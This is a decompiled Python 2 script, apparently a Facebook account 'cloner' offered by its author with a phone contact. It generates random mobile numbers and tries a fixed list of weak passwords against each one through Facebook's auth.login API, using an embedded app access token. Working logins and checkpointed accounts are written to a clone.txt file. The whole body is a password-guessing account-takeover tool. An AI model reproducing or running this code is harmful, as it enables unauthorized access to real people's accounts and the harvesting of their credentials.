# Decompiled By _Rana Nadeem Rajput
...
-----------------------------------------------------------
   ...
   whatsap : 03082503426
   Note      : This Tool for All Cloner
   Note      : This is Iraq Number cracker
-----------------------------------------------------------
                     """
...
def menu():
    os.system('clear')
    print logo
    print '\x1b[1;97m[1]\x1b[1;97mCrack Random Mobile'
    print '\x1b[1;97m[2]\x1b[1;97mCrack Random Mobile [\033[1;92mFree Mod]'
    print '\n\x1b[1;97m[0]  Exit            '
    print '\x1b[1;97m----------------------Rana----------------------------\n'
    action()
...
def action():
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;92m[Rana.Hack]  ' + k + c + user + '  \x1b[1;97m|  ' + pass1
                okb = open('anggaxd/clone.txt', 'a')
                okb.write(k + c + user + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;97m[Rana.cp] \x1b[1;97m' + k + c + user + '  \x1b[1;97m|  ' + pass111
                cps = open('anggaxd/clone.txt', 'a')
                cps.write(k + c + user + pass111 + '\n')
                cps.close()
                cpb.append(c + user + pass111)
            else:
                pass2 = '12344321'
                data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                q = json.load(data)
                if 'access_token' in q:
                    print '\x1b[1;92m[Rana.Hack]  ' + k + c + user + '  \x1b[1;97m|  ' + pass2
                    okb = open('anggaxd/clone.txt', 'a')
                    okb.write(k + c + user + pass2 + '\n')
                    okb.close()
                    oks.append(c + user + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print '\x1b[1;97m[Rana.cp] \x1b[1;97m' + k + c + user + '  \x1b[1;97m|  ' + pass222
                    cps = open('anggaxd/clone.txt', 'a')
                    cps.write(k + c + user + pass222 + '\n')
                    cps.close()
                    cpb.append(c + user + pass222)
                else:
                    pass3 = '1234554321'
                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;92m[Rana.Hack]  ' + k + c + user + '  \x1b[1;97m|  ' + pass3
                        okb = open('anggaxd/clone.txt', 'a')
                        okb.write(k + c + user + pass3 + '\n')
                        okb.close()
                        oks.append(c + user + pass3)
                    elif 'www.facebook.com' in q['error_msg']:
                        print '\x1b[1;97m[Rana.cp] \x1b[1;97m' + k + c + user + '  \x1b[1;97m|  ' + pass333
                        cps = open('anggaxd/clone.txt', 'a')
                        cps.write(k + c + user + pass333 + '\n')
                        cps.close()
                        cpb.append(c + user + pass333)
                    else:
                        pass4 = '1234abcd'
                        data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                        q = json.load(data)
                        if 'access_token' in q:
                            print '\x1b[1;92m[Rana.Hack]  ' + k + c + user + '  \x1b[1;97m|  ' + pass4
                            okb = open('anggaxd/clone.txt', 'a')
                            okb.write(k + c + user + pass4 + '\n')
                            okb.close()
                            oks.append(c + user + pass4)
                        elif 'www.facebook.com' in q['error_msg']:
                            print '\x1b[1;97m[Rana.cp] \x1b[1;97m' + k + c + user + '  \x1b[1;97m|  ' + pass444
                            cps = open('anggaxd/clone.txt', 'a')
                            cps.write(k + c + user + pass444 + '\n')
                            cps.close()
                            cpb.append(c + user + pass444)
                        else:
                            pass5 = '1234512345'
                            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                            q = json.load(data)
                            if 'access_token' in q:
                                print '\x1b[1;92m[Rana.Hack]  ' + k + c + user + '  \x1b[1;97m|  ' + pass5
                                okb = open('anggaxd/clone.txt', 'a')
                                okb.write(k + c + user + pass5 + '\n')
                                okb.close()
                                oks.append(c + user + pass5)
                            elif 'www.facebook.com' in q['error_msg']:
                                print '\x1b[1;97m[Rana.cp] \x1b[1;97m' + k + c + user + '  \x1b[1;97m|  ' + pass555
                                cps = open('anggaxd/clone.txt', 'a')
                                cps.write(k + c + user + pass555 + '\n')
                                cps.close()
                                cpb.append(c + user + pass555)
                            else:
                                pass6 = '1234512345'
                                ...
                                q = json.load(data)
                                if 'access_token' in q:
                                    print '\x1b[1;92m[Rana.Hack]  ' + k + c + user + '  \x1b[1;97m|  ' + pass6
                                    okb = open('anggaxd/clone.txt', 'a')
                                    okb.write(k + c + user + pass6 + '\n')
                                    okb.close()
                                    oks.append(c + user + pass6)
                                elif 'www.facebook.com' in q['error_msg']:
                                    print '\x1b[1;97m[Rana.cp] \x1b[1;97m' + k + c + user + '  \x1b[1;97m|  ' + pass666
                                    cps = open('anggaxd/clone.txt', 'a')
                                    cps.write(k + c + user + pass666 + '\n')
                                    cps.close()
                                    cpb.append(c + user + pass666)
                                else:
                                    pass7 = '1122334455'
                                    ...
                                    q = json.load(data)
                                    if 'access_token' in q:
                                        print '\x1b[1;92m[Rana.Hack]  ' + k + c + user + '  \x1b[1;97m|  ' + pass7
                                        okb = open('anggaxd/clone.txt', 'a')
                                        okb.write(k + c + user + pass7 + '\n')
                                        okb.close()
                                        oks.append(c + user + pass7)
                                    elif 'www.facebook.com' in q['error_msg']:
                                        print '\x1b[1;97m[Rana.cp] \x1b[1;97m' + k + c + user + '  \x1b[1;97m|  ' + pass777
                                        cps = open('anggaxd/clone.txt', 'a')
                                        cps.write(k + c + user + pass777 + '\n')
                                        cps.close()
                                        cpb.append(c + user + pass777)
                                    else:
                                        pass8 = user
                                        ...
                                        q = json.load(data)
                                        if 'access_token' in q:
                                            print '\x1b[1;92m[Rana.Hack]  ' + k + c + user + '  \x1b[1;97m|  ' + pass8
                                            okb = open('anggaxd/clone.txt', 'a')
                                            okb.write(k + c + user + pass8 + '\n')
                                            okb.close()
                                            oks.append(c + user + pass8)
                                        elif 'www.facebook.com' in q['error_msg']:
                                            print '\x1b[1;97m[Rana.cp] \x1b[1;97m' + k + c + user + '  \x1b[1;97m|  ' + pass888
                                            cps = open('anggaxd/clone.txt', 'a')
                                            cps.write(k + c + user + pass888 + '\n')
                                            cps.close()
                                            cpb.append(c + user + pass888)
        except:
            pass
    ...
    print '[\xe2\x9c\x93]for contact me 03082503426'
